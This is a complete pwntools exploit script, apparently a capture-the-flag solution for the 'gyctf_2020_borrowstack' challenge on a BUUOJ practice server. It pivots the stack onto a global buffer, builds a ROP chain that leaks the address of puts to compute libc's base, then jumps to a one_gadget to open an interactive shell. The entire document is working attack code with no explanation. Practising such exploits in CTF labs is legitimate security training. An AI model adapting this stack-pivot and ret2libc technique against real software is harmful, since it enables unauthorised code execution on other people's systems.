from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('gyctf_2020_borrowstack')
io = remote('node4.buuoj.cn', 29937)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc-2.23.so')
elf = ELF('gyctf_2020_borrowstack')
main = elf.symbols['main']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
pop_rdi_ret = 0x400703 
leave_ret = 0x400699
bank = 0x601080
ret = 0x4004c9

payload1 = cyclic(0x60) + p64(bank) + p64(leave_ret)
io.sendafter('Ｗelcome to Stack bank,Tell me what you want\n', payload1)
payload2 = p64(ret) * 28 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)
io.sendafter('Done!You can check and use your borrow stack now!\n', payload2)
libc_base = u64(io.recvn(6).ljust(8, b'\x00')) - libc.symbols['puts']
log.success('libc_base: ' + hex(libc_base))

# one_gadget = libc_base + 0x4527a 
one_gadget = libc_base + 0x4526a
payload1 = cyclic(0x60) + p64(bank) + p64(one_gadget)
io.sendafter('Ｗelcome to Stack bank,Tell me what you want\n', payload1)
io.sendlineafter('Done!You can check and use your borrow stack now!\n', 'a')
io.interactive()

